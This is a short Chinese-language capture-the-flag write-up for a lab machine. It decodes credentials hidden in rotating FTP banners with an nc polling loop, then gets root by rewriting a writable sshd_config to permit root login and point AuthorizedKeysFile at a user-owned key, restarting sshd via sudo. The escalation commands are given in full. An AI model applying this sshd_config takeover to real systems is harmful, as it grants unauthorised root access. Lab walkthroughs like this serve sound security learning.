8080直接看源码，获得凭证 `111:banner` ，但是没什么用，上不去估计是 `nologin`

一开始 ftp 看到的是红色的，回来发现变成黄色的了，单词也不一样

写个脚本看看规律

```bash
while true; do
  printf '%s ' "$(date '+%F %T')"
  { echo quit; } | nc $IP 21 | sed -n '1s/^220-//p'
  sleep 30
done | tee banner.log
```

首字母拼接，获得凭证 `welcome:mazesec`

`sudo -l` 发现可以重启 `sshd` 服务，找了一下发现 `/etc/ssh/sshd_config` 可写

指定 `AuthorizedKeysFile` 就行

```bash
ssh-keygen -t ed25519 -f ~/.ssh/root_key -N ''
cat ~/.ssh/root_key.pub > ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

cat /etc/ssh/sshd_config | \
sed 's/^#\?PermitRootLogin.*/PermitRootLogin yes/' | \
sed 's/^#\?PubkeyAuthentication.*/PubkeyAuthentication yes/' | \
sed 's/^#\?StrictModes.*/StrictModes no/' | \
sed 's|^#\?AuthorizedKeysFile.*|AuthorizedKeysFile /home/welcome/.ssh/authorized_keys|' \
> /tmp/sshd_config_new
cat /tmp/sshd_config_new > /etc/ssh/sshd_config

sudo /sbin/service sshd restart

ssh -i ~/.ssh/root_key root@127.0.0.1
```
